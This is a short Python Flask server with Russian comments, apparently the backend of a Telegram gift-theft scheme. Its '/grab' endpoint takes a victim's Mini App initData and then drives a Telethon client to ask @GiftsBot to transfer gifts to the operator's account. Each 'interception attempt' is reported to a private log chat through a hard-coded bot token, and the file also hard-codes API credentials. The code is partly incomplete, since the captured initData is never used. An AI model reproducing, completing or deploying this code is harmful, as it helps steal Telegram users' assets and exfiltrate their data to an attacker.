import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# --- ТВОИ ДАННЫЕ ---
API_ID = 30356139
API_HASH = "eaf8c970ff553abe2f1578717c82e50e"
MY_ID = 8486064073
LOG_BOT_TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
LOG_CHAT_ID = "-1003794470658"

def send_log(msg):
    # Исправленный формат ссылки
    url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": LOG_CHAT_ID, "text": msg, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Log error: {e}")

async def transfer_gifts(init_data):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        send_log(f"⚡️ <b>ПОПЫТКА ПЕРЕХВАТА...</b>\nПодключаюсь к @GiftsBot...")

        async with client.conversation("@GiftsBot") as conv:
            await conv.send_message(f"/start transfer_{MY_ID}") 
            response = await conv.get_response()
            send_log(f"📩 <b>ОТВЕТ @GiftsBot:</b>\n{response.text}")

    except Exception as e:
        send_log(f"❌ <b>ОШИБКА TELETHON:</b>\n{str(e)}")
    finally:
        await client.disconnect()

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        init_data = data.get('initData')
        
        # Запускаем Telethon в фоне
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(transfer_gifts(init_data))
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        send_log(f"❌ <b>CRITICAL ERROR:</b>\n{str(e)}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)




